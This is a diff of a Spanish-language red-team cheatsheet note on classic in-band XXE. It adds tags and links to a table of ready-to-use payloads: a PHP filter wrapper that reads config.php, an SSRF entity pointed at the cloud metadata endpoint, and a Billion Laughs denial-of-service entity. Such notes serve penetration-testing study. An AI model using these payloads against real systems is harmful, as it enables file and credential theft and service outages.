@@ -2,11 +2,18 @@
 aliases:
 tags:
   - type/cheatsheet
+  - vuln/xxe
+  - technique/execution
+  - asset/web-app
 primary categories:
+  - "[[Red Team]]"
 secondary categories:
+  - "[[Explotación]]"
 tertiary categories:
+  - "[[Explotación Web]]"
 type: CheatSheet
 linked:
+  - "[[XML External Entity (XXE)]]"
 ---
 # XXE - In-band Clásico
 
@@ -20,6 +27,8 @@ linked:
 |**Extracción con Wrappers (PHP)**|Cuando el archivo objetivo contiene caracteres (como `<` o `&`) que rompen el parser XML, empleo filtros de codificación para extraer el contenido en formato Base64.|`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php"> ]><foo>&xxe;</foo>`|
 |**SSRF (Server-Side Request Forgery)**|Aprovecho la capacidad del parser para realizar peticiones de red apuntando la entidad hacia la infraestructura interna o servicios de metadatos de la nube. Útil para [[Escaneo de Puertos Internos]].|`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]><foo>&xxe;</foo>`|
 |**Denegación de Servicio (Billion Laughs)**|Declaro múltiples entidades anidadas que, al expandirse recursivamente, agotan la memoria del parser XML, provocando la caída del servicio u originando un cuello de botella computacional.|`<!DOCTYPE foo [ <!ENTITY a "lol"> <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"> ]><foo>&b;</foo>` _(Nota: requiere encadenamiento profundo en un entorno real)._|
+
+^xxe-clasico-inband
 
 ## Consideraciones de Explotación
 
